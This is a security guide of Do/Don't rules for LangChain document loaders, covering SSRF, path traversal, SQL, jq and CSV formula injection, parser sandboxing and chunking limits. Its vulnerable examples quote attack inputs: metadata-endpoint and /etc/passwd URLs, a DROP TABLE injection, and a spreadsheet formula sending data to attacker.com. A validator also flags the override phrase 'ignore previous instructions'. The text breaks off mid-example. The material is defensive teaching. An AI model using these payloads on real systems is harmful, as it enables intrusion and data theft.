# LangChain Document Loaders Security Rules

Security patterns for LangChain document loaders in RAG pipelines. These rules address SSRF, path traversal, injection, credential leakage, and resource exhaustion risks specific to LangChain's loader ecosystem. Imports follow the langchain-community 0.3.x split-package layout.

---

## Quick Reference

| Rule | Level | Risk | Primary Defense |
|------|-------|------|-----------------|
| Web Loader Security | `strict` | SSRF, data exfiltration | URL allowlisting, timeout limits |
| File Loader Security | `strict` | Path traversal, arbitrary file read | Path validation, type checking |
| Database Loader Security | `strict` | SQL injection, credential exposure | Parameterized queries, least privilege |
| API Loader Security | `strict` | Auth bypass, rate limit abuse | Token management, response validation |
| Git Loader Security | `strict` | Credential leakage via history/URL | SSH key or env-var PAT, never in URL |
| S3/Cloud Storage Loader Security | `strict` | Over-privileged IAM, bucket sprawl | Least-privilege IAM, bucket allowlist |
| UnstructuredFileLoader Parser Security | `strict` | Parser CVE exploitation (LibreOffice/poppler) | Sandbox parsing, pin parser versions |
| JSONLoader jq_schema Injection | `strict` | Field exfiltration via user-controlled jq | Static or allowlisted jq_schema |
| CSVLoader Formula Injection | `warning` | Excel formula execution (CWE-1236) | Sanitize =/+/-/@ prefix on output |
| Recursive Chunking Security | `warning` | Resource exhaustion, memory overflow | Size limits, overlap validation |
| Metadata Extraction Security | `warning` | PII leakage, injection | Field sanitization, PII filtering |
| Async Loader Security | `warning` | Resource exhaustion, timeout abuse | Concurrency limits, timeout handling |
| Custom Loader Security | `strict` | Input validation bypass, injection | Comprehensive validation, error handling |

---

## Rule: Web Loader Security

**Level**: `strict`

**When**: Using `WebBaseLoader`, `UnstructuredURLLoader`, or any loader that fetches content from URLs

**Do**:
```python
from langchain_community.document_loaders import WebBaseLoader
from urllib.parse import urlparse
import ipaddress
import socket
from typing import Optional
import httpx

class SecureWebLoader:
    """Secure wrapper for LangChain web loaders with SSRF protection."""

    ALLOWED_DOMAINS = {
        "docs.company.com",
        "wiki.internal.com",
        "confluence.company.com",
    }

    BLOCKED_SCHEMES = {"file", "ftp", "gopher", "data", "javascript"}

    def __init__(
        self,
        timeout: int = 30,
        max_content_size: int = 10 * 1024 * 1024,  # 10MB
        verify_ssl: bool = True,
    ):
        self.timeout = timeout
        self.max_content_size = max_content_size
        self.verify_ssl = verify_ssl

    def validate_url(self, url: str) -> bool:
        """Validate URL against security policy."""
        parsed = urlparse(url)

        # Check scheme
        if parsed.scheme not in ("http", "https"):
            raise ValueError(f"Invalid scheme: {parsed.scheme}. Only HTTP/HTTPS allowed.")

        if parsed.scheme in self.BLOCKED_SCHEMES:
            raise ValueError(f"Blocked scheme: {parsed.scheme}")

        # Check domain allowlist
        if parsed.netloc not in self.ALLOWED_DOMAINS:
            raise ValueError(f"Domain not in allowlist: {parsed.netloc}")

        # Prevent SSRF to internal networks
        try:
            ip = socket.gethostbyname(parsed.hostname)
            ip_obj = ipaddress.ip_address(ip)

            if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
                raise ValueError(f"URL resolves to private/internal IP: {ip}")
        except socket.gaierror:
            raise ValueError(f"Cannot resolve hostname: {parsed.hostname}")

        return True

    def load(self, urls: list[str]) -> list:
        """Load documents from validated URLs."""
        # Validate all URLs first
        for url in urls:
            self.validate_url(url)

        # Configure loader with security settings
        loader = WebBaseLoader(
            web_paths=urls,
            requests_kwargs={
                "timeout": self.timeout,
                "verify": self.verify_ssl,
                "headers": {
                    "User-Agent": "SecureRAGLoader/1.0",
                },
            },
        )

        # Load with size check
        documents = loader.load()

        for doc in documents:
            if len(doc.page_content) > self.max_content_size:
                raise ValueError(
                    f"Content from {doc.metadata.get('source')} "
                    f"exceeds size limit: {len(doc.page_content)} bytes"
                )

        return documents


# Usage
secure_loader = SecureWebLoader()
docs = secure_loader.load(["https://docs.company.com/api-guide"])
```

**Don't**:
```python
from langchain_community.document_loaders import WebBaseLoader

# VULNERABLE: No URL validation - SSRF possible
def load_web_content(url: str):
    # Attacker can pass:
    # - file:///etc/passwd
    # - http://169.254.169.254/latest/meta-data (AWS metadata)
    # - http://localhost:8080/admin

    loader = WebBaseLoader(url)  # No validation
    return loader.load()  # No timeout, no size limit
```

**Why**: WebBaseLoader without URL validation enables Server-Side Request Forgery (SSRF). Attackers can fetch internal resources, cloud metadata endpoints (AWS/GCP/Azure), or internal services. URL allowlisting and IP validation prevent these attacks. Web and API loaders also receive external content that may contain adversarial instructions targeting the LLM downstream.

**Refs**: CWE-918 (SSRF), OWASP A10:2025 (SSRF), CWE-441 (Unintended Proxy), LLM01:2025 (Prompt Injection via loaded content)

---

## Rule: File Loader Security

**Level**: `strict`

**When**: Using `DirectoryLoader`, `TextLoader`, `PyPDFLoader`, or any file-based loader

**Do**:
```python
from langchain_community.document_loaders import DirectoryLoader, TextLoader
from pathlib import Path
import magic
from typing import Optional

class SecureFileLoader:
    """Secure wrapper for LangChain file loaders with path traversal protection."""

    ALLOWED_EXTENSIONS = {".txt", ".md", ".pdf", ".docx", ".csv", ".json"}

    ALLOWED_MIME_TYPES = {
        "text/plain",
        "text/markdown",
        "application/pdf",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "text/csv",
        "application/json",
    }

    def __init__(
        self,
        base_directory: str,
        max_file_size: int = 50 * 1024 * 1024,  # 50MB
        max_files: int = 1000,
    ):
        # Resolve and validate base directory
        self.base_directory = Path(base_directory).resolve()
        if not self.base_directory.exists():
            raise ValueError(f"Base directory does not exist: {base_directory}")

        self.max_file_size = max_file_size
        self.max_files = max_files
        self._mime_detector = magic.Magic(mime=True)

    def validate_path(self, file_path: str) -> Path:
        """Validate file path against security policy."""
        # Resolve to absolute path
        resolved = Path(file_path).resolve()

        # Prevent path traversal
        try:
            resolved.relative_to(self.base_directory)
        except ValueError:
            raise ValueError(
                f"Path traversal attempt detected: {file_path} "
                f"is outside base directory {self.base_directory}"
            )

        # Check extension
        if resolved.suffix.lower() not in self.ALLOWED_EXTENSIONS:
            raise ValueError(f"File extension not allowed: {resolved.suffix}")

        # Check file size
        if resolved.exists():
            size = resolved.stat().st_size
            if size > self.max_file_size:
                raise ValueError(f"File exceeds size limit: {size} bytes")

            # Validate MIME type from content
            with open(resolved, "rb") as f:
                mime_type = self._mime_detector.from_buffer(f.read(8192))

            if mime_type not in self.ALLOWED_MIME_TYPES:
                raise ValueError(f"Invalid MIME type: {mime_type}")

        return resolved

    def load_file(self, file_path: str) -> list:
        """Load single file with security validation."""
        validated_path = self.validate_path(file_path)

        loader = TextLoader(str(validated_path))
        return loader.load()

    def load_directory(
        self,
        glob_pattern: str = "**/*.txt",
        recursive: bool = True,
    ) -> list:
        """Load directory with security controls."""

        # Validate glob pattern doesn't escape base directory
        if ".." in glob_pattern:
            raise ValueError("Path traversal in glob pattern not allowed")

        # Count files first
        files = list(self.base_directory.glob(glob_pattern))
        if len(files) > self.max_files:
            raise ValueError(
                f"Too many files ({len(files)}), limit is {self.max_files}"
            )

        # Validate each file
        for file_path in files:
            self.validate_path(str(file_path))

        # Load with DirectoryLoader
        loader = DirectoryLoader(
            str(self.base_directory),
            glob=glob_pattern,
            recursive=recursive,
            loader_cls=TextLoader,
            show_progress=True,
        )

        return loader.load()


# Usage
secure_loader = SecureFileLoader("/var/data/documents")
docs = secure_loader.load_directory("**/*.md")
```

**Don't**:
```python
from langchain_community.document_loaders import DirectoryLoader

# VULNERABLE: No path validation
def load_documents(user_path: str):
    # Attacker can pass:
    # - "../../../etc/passwd"
    # - "/etc/shadow"
    # - "/var/log/application.log"

    loader = DirectoryLoader(
        user_path,  # User-controlled path - path traversal!
        glob="**/*",  # Loads everything
    )
    return loader.load()  # No size limits, no type validation
```

**Why**: File loaders without path validation allow path traversal attacks. Attackers can read sensitive system files, configuration files with credentials, or application logs. Base directory confinement and MIME validation prevent unauthorized file access.

**Refs**: CWE-22 (Path Traversal), CWE-434 (Unrestricted Upload), OWASP A03:2025 (Injection)

---

## Rule: Database Loader Security

**Level**: `strict`

**When**: Using `SQLDatabaseLoader`, `SQLLoader`, or any database-connected loader

**Do**:
```python
from langchain_community.document_loaders import SQLDatabaseLoader
from langchain_community.utilities import SQLDatabase
from sqlalchemy import create_engine
from typing import Optional
import os

class SecureDatabaseLoader:
    """Secure wrapper for LangChain SQL loaders with injection protection."""

    # Allowed tables (allowlist approach)
    ALLOWED_TABLES = {"documents", "articles", "knowledge_base"}

    # Columns that should never be loaded
    BLOCKED_COLUMNS = {"password", "api_key", "secret", "token", "ssn", "credit_card"}

    def __init__(
        self,
        connection_string: Optional[str] = None,
        max_rows: int = 10000,
        query_timeout: int = 30,
    ):
        # Load connection string from environment (never hardcode)
        self.connection_string = connection_string or os.environ.get("DATABASE_URL")
        if not self.connection_string:
            raise ValueError("Database connection string not configured")

        self.max_rows = max_rows
        self.query_timeout = query_timeout

        # Create engine with security settings
        self.engine = create_engine(
            self.connection_string,
            pool_pre_ping=True,
            pool_recycle=3600,
            connect_args={"connect_timeout": 10},
        )

        self.db = SQLDatabase(
            engine=self.engine,
            include_tables=list(self.ALLOWED_TABLES),  # Only expose allowed tables
        )

    def validate_query(self, table: str, columns: list[str]) -> None:
        """Validate query parameters against security policy."""
        # Check table allowlist
        if table not in self.ALLOWED_TABLES:
            raise ValueError(f"Table not in allowlist: {table}")

        # Check for blocked columns
        for col in columns:
            if col.lower() in self.BLOCKED_COLUMNS:
                raise ValueError(f"Blocked column: {col}")

    def load_table(
        self,
        table: str,
        columns: list[str],
        where_clause: Optional[dict] = None,
    ) -> list:
        """Load from database with parameterized queries."""

        # Validate inputs
        self.validate_query(table, columns)

        # Build parameterized query (NEVER string concatenation)
        safe_columns = ", ".join(
            f'"{col}"' for col in columns  # Quote column names
        )

        query = f'SELECT {safe_columns} FROM "{table}"'
        params = {}

        if where_clause:
            # Use parameterized WHERE clause
            conditions = []
            for i, (key, value) in enumerate(where_clause.items()):
                # Validate column name
                if key.lower() in self.BLOCKED_COLUMNS:
                    raise ValueError(f"Cannot filter on blocked column: {key}")

                param_name = f"param_{i}"
                conditions.append(f'"{key}" = :{param_name}')
                params[param_name] = value

            query += " WHERE " + " AND ".join(conditions)

        # Add row limit
        query += f" LIMIT {self.max_rows}"

        loader = SQLDatabaseLoader(
            query=query,
            db=self.db,
            parameters=params,
        )

        return loader.load()

    def load_with_custom_query(self, query: str, params: dict) -> list:
        """Load with caller-provided parameterized query."""

        # Validate query doesn't contain dangerous operations
        query_upper = query.upper()
        dangerous_keywords = ["DROP", "DELETE", "INSERT", "UPDATE", "ALTER", "TRUNCATE"]

        for keyword in dangerous_keywords:
            if keyword in query_upper:
                raise ValueError(f"Query contains dangerous keyword: {keyword}")

        # Ensure query has LIMIT
        if "LIMIT" not in query_upper:
            query += f" LIMIT {self.max_rows}"

        loader = SQLDatabaseLoader(
            query=query,
            db=self.db,
            parameters=params,  # Always use parameters, never string interpolation
        )

        return loader.load()


# Usage
secure_loader = SecureDatabaseLoader()
docs = secure_loader.load_table(
    table="documents",
    columns=["title", "content", "author"],
    where_clause={"category": "technical"}
)
```

**Don't**:
```python
from langchain_community.document_loaders import SQLDatabaseLoader
from langchain_community.utilities import SQLDatabase

# VULNERABLE: SQL injection possible
def load_from_database(table: str, filter_value: str):
    db = SQLDatabase.from_uri(
        "postgresql://user:password@localhost/db"  # Hardcoded credentials!
    )

    # String concatenation = SQL injection
    query = f"SELECT * FROM {table} WHERE category = '{filter_value}'"

    loader = SQLDatabaseLoader(query=query, db=db)
    return loader.load()

# Attacker passes: filter_value = "'; DROP TABLE users; --"
```

**Why**: SQL loaders with string concatenation enable SQL injection. Attackers can extract sensitive data, modify records, or drop tables. Parameterized queries and table allowlisting prevent injection and limit data exposure.

**Refs**: CWE-89 (SQL Injection), OWASP A03:2025 (Injection), CWE-798 (Hardcoded Credentials)

---

## Rule: API Loader Security

**Level**: `strict`

**When**: Using `NotionDBLoader`, `GitHubLoader`, `SlackLoader`, or any API-based loader

**Do**:
```python
from langchain_community.document_loaders import NotionDBLoader
import os
import time
from typing import Optional
import httpx
import logging

class SecureAPILoader:
    """Secure wrapper for LangChain API loaders with auth and rate limiting."""

    def __init__(
        self,
        api_key: Optional[str] = None,
        rate_limit: int = 60,  # requests per minute
        timeout: int = 30,
        max_retries: int = 3,
    ):
        # Load API key from secure source
        self.api_key = api_key or os.environ.get("NOTION_API_KEY")
        if not self.api_key:
            raise ValueError("API key not configured")

        # Validate API key format (basic check)
        if len(self.api_key) < 20:
            raise ValueError("Invalid API key format")

        self.rate_limit = rate_limit
        self.timeout = timeout
        self.max_retries = max_retries

        # Rate limiting state
        self._request_times: list[float] = []

    def _check_rate_limit(self) -> None:
        """Enforce rate limiting."""
        now = time.time()
        minute_ago = now - 60

        # Remove old requests
        self._request_times = [t for t in self._request_times if t > minute_ago]

        if len(self._request_times) >= self.rate_limit:
            wait_time = self._request_times[0] - minute_ago
            raise RuntimeError(f"Rate limit exceeded. Wait {wait_time:.1f}s")

        self._request_times.append(now)

    def validate_response(self, documents: list) -> list:
        """Validate API response for security issues."""
        validated = []

        for doc in documents:
            content = doc.page_content

            # Check for excessive size
            if len(content) > 1_000_000:  # 1MB per document
                raise ValueError(f"Document exceeds size limit: {len(content)} bytes")

            # Log suspicious patterns; external API content may contain adversarial text
            suspicious_patterns = [
                "ignore previous instructions",
                "system:",
                "assistant:",
            ]

            content_lower = content.lower()
            for pattern in suspicious_patterns:
                if pattern in content_lower:
                    logging.warning(f"Suspicious pattern in API response: {pattern}")

            validated.append(doc)

        return validated

    def load_notion_database(
        self,
        database_id: str,
        filter_params: Optional[dict] = None,
    ) -> list:
        """Load from Notion with security controls."""

        # Validate database ID format
        if not database_id or len(database_id) != 32:
            raise ValueError("Invalid Notion database ID format")

        # Rate limit check
        self._check_rate_limit()

        loader = NotionDBLoader(
            integration_token=self.api_key,
            database_id=database_id,
            request_timeout_sec=self.timeout,
        )

        documents = loader.load()
        return self.validate_response(documents)

    def load_with_retry(self, load_func, *args, **kwargs) -> list:
        """Load with retry logic for resilience."""
        last_error = None

        for attempt in range(self.max_retries):
            try:
                self._check_rate_limit()
                return load_func(*args, **kwargs)
            except httpx.TimeoutException as e:
                last_error = e
                time.sleep(2 ** attempt)  # Exponential backoff
            except httpx.HTTPStatusError as e:
                if e.response.status_code == 429:  # Rate limited
                    time.sleep(60)
                    last_error = e
                elif e.response.status_code == 401:
                    raise ValueError("Invalid API credentials")
                else:
                    raise

        raise RuntimeError(f"Failed after {self.max_retries} retries: {last_error}")


# Usage
secure_loader = SecureAPILoader()
docs = secure_loader.load_notion_database(
    database_id="abcd1234abcd1234abcd1234abcd1234"
)
```

**Don't**:
```python
from langchain_community.document_loaders import NotionDBLoader

# VULNERABLE: Insecure API usage
def load_notion(database_id: str):
    loader = NotionDBLoader(
        integration_token="secret_abc123xyz",  # Hardcoded token!
        database_id=database_id,
        # No timeout - can hang forever
        # No rate limiting - can exhaust API quota
        # No response validation
    )
    return loader.load()
```

**Why**: API loaders without proper authentication management expose credentials. Missing rate limiting can exhaust quotas or trigger bans. Response validation catches malformed or malicious data from compromised APIs. External API content may embed adversarial prompts targeting the LLM.

**Refs**: CWE-798 (Hardcoded Credentials), CWE-400 (Resource Exhaustion), CWE-20 (Input Validation), LLM01:2025 (Prompt Injection)

---

## Rule: Git Loader Security

**Level**: `strict`

**When**: Using `GitLoader` or `GithubFileLoader` to load content from git repositories

**Do**:
```python
from langchain_community.document_loaders import GitLoader
import os
import re
from pathlib import Path

class SecureGitLoader:
    """Secure wrapper for LangChain GitLoader.

    Credential leakage risks:
    1. Tokens embedded in remote URLs are visible in `git remote -v`,
       process lists, and .git/config which loaders may read.
    2. Secrets committed to history are loaded as document content.
    3. PATs in environment variables can be masked; tokens in URLs cannot.
    """

    # Repositories this loader is permitted to clone
    ALLOWED_REPOS = {
        "git@github.com:your-org/docs.git",
        "git@github.com:your-org/knowledge-base.git",
    }

    def __init__(
        self,
        clone_url: str,
        clone_path: str,
        branch: str = "main",
        file_filter=None,
    ):
        # Reject URLs that embed credentials (https://token@host pattern)
        self._reject_credential_url(clone_url)

        if clone_url not in self.ALLOWED_REPOS:
            raise ValueError(f"Repository not in allowlist: {clone_url}")

        self.clone_url = clone_url
        self.clone_path = Path(clone_path).resolve()
        self.branch = branch
        self.file_filter = file_filter or (lambda p: p.endswith(".md"))

    @staticmethod
    def _reject_credential_url(url: str) -> None:
        """Reject URLs with embedded credentials."""
        # Matches https://token:x-oauth-basic@host or https://user:pass@host
        if re.search(r"https?://[^@]+:[^@]+@", url):
            raise ValueError(
                "Credential embedded in URL detected. "
                "Use SSH key authentication or set GITHUB_TOKEN env var."
            )

    def load(self) -> list:
        """Load repository content without credential exposure."""
        # SSH key auth: key must be loaded in ssh-agent before this call.
        # For HTTPS repos, GitLoader picks up GIT_ASKPASS / credential helper;
        # never pass the token in the URL.
        loader = GitLoader(
            clone_url=self.clone_url,
            repo_path=str(self.clone_path),
            branch=self.branch,
            file_filter=self.file_filter,
        )
        return loader.load()


# Usage — SSH remote, no token in URL
loader = SecureGitLoader(
    clone_url="git@github.com:your-org/docs.git",
    clone_path="/tmp/rag-repo",
    branch="main",
)
docs = loader.load()
```

**Don't**:
```python
from langchain_community.document_loaders import GitLoader

# VULNERABLE: PAT embedded in clone URL
GITHUB_TOKEN = "ghp_realTokenHere"  # Also wrong: hardcoded

loader = GitLoader(
    # Token visible in process list, .git/config, and any loader that reads metadata
    clone_url=f"https://{GITHUB_TOKEN}@github.com/org/repo.git",
    repo_path="/tmp/repo",
    branch="main",
)
docs = loader.load()
```

**Why**: Embedding a Personal Access Token (PAT) in the remote URL stores it in `.git/config`, exposes it in process listings, and causes it to appear in loader metadata. SSH key authentication or a git credential helper keeps secrets out of URLs entirely. Historical commits loaded as documents may also contain secrets committed to the repo.

**Refs**: CWE-798 (Hardcoded Credentials), CWE-312 (Cleartext Storage of Sensitive Information), OWASP A02:2025 (Cryptographic Failures)

---

## Rule: S3/Cloud Storage Loader Security

**Level**: `strict`

**When**: Using `S3FileLoader`, `S3DirectoryLoader`, `GCSFileLoader`, or equivalent cloud-storage loaders

**Do**:
```python
from langchain_community.document_loaders import S3DirectoryLoader
import boto3
from botocore.config import Config
import os

class SecureS3Loader:
    """Secure wrapper for S3-backed LangChain loaders.

    IAM policy attached to the execution role must grant:
      s3:GetObject on arn:aws:s3:::ALLOWED_BUCKET/*
    No s3:ListAllMyBuckets, no wildcard bucket ARN.
    """

    # Explicit allowlist; wildcards are not permitted
    ALLOWED_BUCKETS = {
        "company-rag-documents-prod",
        "company-rag-documents-staging",
    }

    def __init__(self, bucket: str, prefix: str = ""):
        if bucket not in self.ALLOWED_BUCKETS:
            raise ValueError(f"Bucket not in allowlist: {bucket}")

        # Prefix must not escape the allowed path
        if ".." in prefix or prefix.startswith("/"):
            raise ValueError(f"Invalid prefix: {prefix}")

        self.bucket = bucket
        self.prefix = prefix

        # Credentials come from the instance role or environment;
        # never pass aws_access_key_id / aws_secret_access_key explicitly.
        self.session = boto3.Session()
        # Enforce regional endpoint to prevent credential forwarding to
        # unexpected regions via SSRF-style bucket redirects.
        self.client = self.session.client(
            "s3",
            region_name=os.environ["AWS_DEFAULT_REGION"],
            config=Config(
                signature_version="s3v4",
                retries={"max_attempts": 3, "mode": "standard"},
            ),
        )

    def load(self) -> list:
        """Load objects from the allowlisted bucket and prefix."""
        loader = S3DirectoryLoader(
            bucket=self.bucket,
            prefix=self.prefix,
        )
        return loader.load()


# Usage — bucket and prefix from config, never from user input directly
loader = SecureS3Loader(
    bucket="company-rag-documents-prod",
    prefix="knowledge-base/2025/",
)
docs = loader.load()
```

**Don't**:
```python
from langchain_community.document_loaders import S3DirectoryLoader
import os

# VULNERABLE: bucket from user input, wildcard IAM, hardcoded keys
def load_from_s3(user_bucket: str, user_prefix: str):
    # IAM policy: s3:GetObject on arn:aws:s3:::* (wildcard — wrong)
    loader = S3DirectoryLoader(
        bucket=user_bucket,   # Attacker can specify any bucket
        prefix=user_prefix,   # Path traversal possible
        aws_access_key_id=os.environ["AWS_KEY"],        # Should use role
        aws_secret_access_key=os.environ["AWS_SECRET"],
    )
    return loader.load()
```

**Why**: Accepting a user-supplied bucket name allows an attacker to redirect the loader to any S3 bucket the role can read, potentially exfiltrating data from unrelated buckets. Wildcard IAM policies amplify the blast radius. Explicit bucket allowlisting and least-privilege IAM roles confine access to only the intended data sources.

**Refs**: CWE-284 (Improper Access Control), OWASP A01:2025 (Broken Access Control), OWASP A05:2025 (Security Misconfiguration)

---

## Rule: UnstructuredFileLoader Parser Security

**Level**: `strict`

**When**: Using `UnstructuredFileLoader`, `UnstructuredPDFLoader`, `UnstructuredWordDocumentLoader`, or any loader that delegates to LibreOffice, poppler, python-docx, or similar parsers

**Do**:
```python
from langchain_community.document_loaders import UnstructuredFileLoader
from pathlib import Path
import subprocess
import tempfile
import os
import logging

logger = logging.getLogger(__name__)

# Pin parser library versions in requirements.txt / pyproject.toml.
# Example (update after reviewing CVE advisories):
#   unstructured[pdf,docx]==0.14.x
#   python-docx==1.1.x
#   pypdf==4.x
#   poppler-utils==24.x  (system package, pin in Dockerfile)

class SandboxedUnstructuredLoader:
    """Run UnstructuredFileLoader inside a subprocess sandbox.

    Parsing untrusted office/PDF files with LibreOffice or poppler carries
    CVE risk (e.g., CVE-2023-26360, CVE-2024-4367). Isolating parsing in a
    subprocess with a read-only filesystem view limits the blast radius of a
    parser exploit.
    """

    ALLOWED_EXTENSIONS = {".pdf", ".docx", ".pptx", ".xlsx", ".txt", ".md"}

    def __init__(self, base_dir: str, max_file_size: int = 20 * 1024 * 1024):
        self.base_dir = Path(base_dir).resolve()
        self.max_file_size = max_file_size

    def _validate_file(self, file_path: Path) -> None:
        """Pre-flight checks before handing the file to the parser."""
        resolved = file_path.resolve()

        # Confine to base directory
        try:
            resolved.relative_to(self.base_dir)
        except ValueError:
            raise ValueError(f"Path traversal attempt: {file_path}")

        if resolved.suffix.lower() not in self.ALLOWED_EXTENSIONS:
            raise ValueError(f"Extension not allowed: {resolved.suffix}")

        if resolved.stat().st_size > self.max_file_size:
            raise ValueError(f"File too large: {resolved.stat().st_size} bytes")

    def load(self, file_path: str) -> list:
        """Parse file in a subprocess to isolate parser CVE impact."""
        path = Path(file_path)
        self._validate_file(path)

        # Run parsing logic in a child process with a clean environment.
        # On Linux, add seccomp/namespace isolation via a container or
        # bubblewrap for stronger sandboxing.
        result = subprocess.run(
            ["python", "-m", "rag.sandbox_parser", str(path)],
            capture_output=True,
            text=True,
            timeout=60,
            # Drop inherited environment to prevent secret leakage to child
            env={"PATH": "/usr/bin:/bin", "HOME": tempfile.gettempdir()},
        )

        if result.returncode != 0:
            logger.error("Parser subprocess failed: %s", result.stderr[:500])
            raise RuntimeError("Document parsing failed")

        # Deserialize structured output (JSON), not raw Python objects
        import json
        return json.loads(result.stdout)
```

**Don't**:
```python
from langchain_community.document_loaders import UnstructuredFileLoader

# VULNERABLE: Unpinned parser, no sandbox, no size limit
def parse_uploaded_file(file_path: str):
    # Any CVE in LibreOffice/poppler/python-docx runs in the app process
    # with full network and filesystem access.
    loader = UnstructuredFileLoader(file_path)
    return loader.load()
```

**Why**: LibreOffice, poppler, and python-docx have a history of memory-corruption CVEs triggered by malformed files. Processing untrusted uploads inside the application process means a parser exploit inherits the process's credentials and network access. Subprocess isolation and pinned parser versions bound the exposure window and limit lateral movement.

**Refs**: CWE-119 (Buffer Errors), CWE-1357 (Reliance on Insufficiently Trustworthy Component), OWASP A06:2025 (Vulnerable and Outdated Components)

---

## Rule: JSONLoader jq_schema Injection

**Level**: `strict`

**When**: Using `JSONLoader` with a `jq_schema` that is derived from user input

**Do**:
```python
from langchain_community.document_loaders import JSONLoader
from typing import Literal

# Define every jq_schema the application legitimately needs.
# Never interpolate user input into a jq expression.
ALLOWED_JQ_SCHEMAS: dict[str, str] = {
    "content":         ".[] | .content",
    "title_content":   ".[] | {title: .title, body: .content}",
    "summary":         ".[] | .summary",
}

def load_json_secure(
    file_path: str,
    schema_key: Literal["content", "title_content", "summary"],
    content_key: str = "page_content",
) -> list:
    """Load JSON with a statically chosen jq_schema.

    jq expressions can traverse arbitrary object paths, apply string
    interpolation, and call built-in functions. A user-controlled schema
    can exfiltrate fields the caller is not supposed to access
    (e.g., `.[] | .api_key`).
    """
    if schema_key not in ALLOWED_JQ_SCHEMAS:
        raise ValueError(
            f"jq_schema key '{schema_key}' not in allowlist. "
            f"Allowed: {list(ALLOWED_JQ_SCHEMAS)}"
        )

    jq_schema = ALLOWED_JQ_SCHEMAS[schema_key]

    loader = JSONLoader(
        file_path=file_path,
        jq_schema=jq_schema,
        content_key=content_key,
    )
    return loader.load()
```

**Don't**:
```python
from langchain_community.document_loaders import JSONLoader

# VULNERABLE: user controls the jq expression
def load_json(file_path: str, user_schema: str):
    loader = JSONLoader(
        file_path=file_path,
        jq_schema=user_schema,  # Attacker passes: ".[] | .api_key"
    )
    return loader.load()
```

**Why**: `jq_schema` is a full jq expression. A user-controlled expression can extract any field from the JSON document, including secrets, credentials, or PII that the loader is not supposed to surface. Restricting `jq_schema` to a static allowlist eliminates the exfiltration vector.

**Refs**: CWE-20 (Improper Input Validation), CWE-200 (Exposure of Sensitive Information), OWASP A01:2025 (Broken Access Control)

---

## Rule: CSVLoader Formula Injection

**Level**: `warning`

**When**: Using `CSVLoader` and the loaded content will be displayed in a UI, exported to Excel/Sheets, or rendered in a spreadsheet-aware format

**Do**:
```python
from langchain_community.document_loaders import CSVLoader
from langchain_core.documents import Document
import re

# Prefixes that Excel and Google Sheets interpret as formula starters (CWE-1236)
_FORMULA_PREFIX_RE = re.compile(r"^[=+\-@\t\r]")

def _sanitize_cell(value: str) -> str:
    """Prepend a single quote to neutralize spreadsheet formula prefixes.

    A leading quote is the standard mitigation: Excel treats the cell
    as text and does not evaluate it as a formula.
    """
    if _FORMULA_PREFIX_RE.match(value):
        return "'" + value
    return value

def load_csv_secure(file_path: str, source_column: str | None = None) -> list[Document]:
    """Load CSV and sanitize cells before they enter the RAG pipeline.

    Sanitization is applied to page_content; callers that write content
    back to a spreadsheet must not strip the leading quote.
    """
    loader = CSVLoader(
        file_path=file_path,
        source_column=source_column,
    )
    raw_docs = loader.load()

    sanitized = []
    for doc in raw_docs:
        safe_content = _sanitize_cell(doc.page_content)
        sanitized.append(
            Document(page_content=safe_content, metadata=doc.metadata)
        )
    return sanitized
```

**Don't**:
```python
from langchain_community.document_loaders import CSVLoader

# VULNERABLE: formula injection not sanitized
def load_csv(file_path: str):
    loader = CSVLoader(file_path=file_path)
    return loader.load()

# If a CSV cell contains: =HYPERLINK("http://attacker.com/"&A1,"click")
# and the RAG output is later written to Excel, the formula executes.
```

**Why**: Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) evaluate cells starting with `=`, `+`, `-`, or `@` as formulas. If RAG pipeline output is exported to a spreadsheet, an attacker who controls CSV input can inject a formula that exfiltrates data or executes macros (DDE). Prefixing with a single quote neutralizes formula execution without altering visible content.

**Refs**: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File), OWASP A03:2025 (Injection)

---

## Rule: Recursive Chunking Security

**Level**: `warning`

**When**: Using `RecursiveCharacterTextSplitter` or any text splitting with documents

**Do**:
```python
from langchain_text_splitters import RecursiveCharacterTextSplitter

class SecureTextSplitter:
    """Secure wrapper for LangChain text splitters with resource limits."""

    def __init__(
        self,
        chunk_size: int = 1000,
        chunk_overlap: int = 200,
        max_chunks: int = 10000,
        max_input_size: int = 100 * 1024 * 1024,  # 100MB
    ):
        # Validate configuration
        if chunk_overlap >= chunk_size:
            raise ValueError(
                f"Overlap ({chunk_overlap}) must be less than chunk size ({chunk_size})"
            )

        if chunk_overlap < 0:
            raise ValueError("Overlap cannot be negative")

        # Prevent excessive overlap that could cause memory issues
        max_overlap_ratio = 0.5
        if chunk_overlap > chunk_size * max_overlap_ratio:
            raise ValueError(
                f"Overlap ratio ({chunk_overlap/chunk_size:.2f}) "
                f"exceeds maximum ({max_overlap_ratio})"
            )

        self.chunk_size = chunk_size
        self.chunk_overlap = chunk_overlap
        self.max_chunks = max_chunks
        self.max_input_size = max_input_size

        self.splitter = RecursiveCharacterTextSplitter(
            chunk_size=chunk_size,
            chunk_overlap=chunk_overlap,
            length_function=len,
            is_separator_regex=False,
        )

    def split_text(self, text: str) -> list[str]:
        """Split text with security controls."""

        if len(text) > self.max_input_size:
            raise ValueError(
                f"Input text ({len(text)} bytes) exceeds limit ({self.max_input_size})"
            )

        estimated_chunks = len(text) / (self.chunk_size - self.chunk_overlap)
        if estimated_chunks > self.max_chunks:
            raise ValueError(
                f"Estimated chunks ({estimated_chunks:.0f}) exceeds limit ({self.max_chunks})"
            )

        chunks = self.splitter.split_text(text)

        if len(chunks) > self.max_chunks:
            raise ValueError(
                f"Actual chunks ({len(chunks)}) exceeds limit ({self.max_chunks})"
            )

        return chunks

    def split_documents(self, documents: list) -> list:
        """Split documents with security controls."""

        total_size = sum(len(doc.page_content) for doc in documents)
        if total_size > self.max_input_size:
            raise ValueError(
                f"Total document size ({total_size} bytes) exceeds limit"
            )

        all_chunks = self.splitter.split_documents(documents)

        if len(all_chunks) > self.max_chunks:
            raise ValueError(
                f"Total chunks ({len(all_chunks)}) exceeds limit ({self.max_chunks})"
            )

        return all_chunks


# Usage
secure_splitter = SecureTextSplitter(
    chunk_size=1000,
    chunk_overlap=200,
    max_chunks=5000,
)
chunks = secure_splitter.split_text(document_text)
```

**Don't**:
```python
from langchain_text_splitters import RecursiveCharacterTextSplitter

# VULNERABLE: No resource limits
def split_document(text: str, user_chunk_size: int, user_overlap: int):
    splitter = RecursiveCharacterTextSplitter(
        chunk_size=user_chunk_size,  # Could be 1
        chunk_overlap=user_overlap,  # Could be larger than chunk_size!
    )
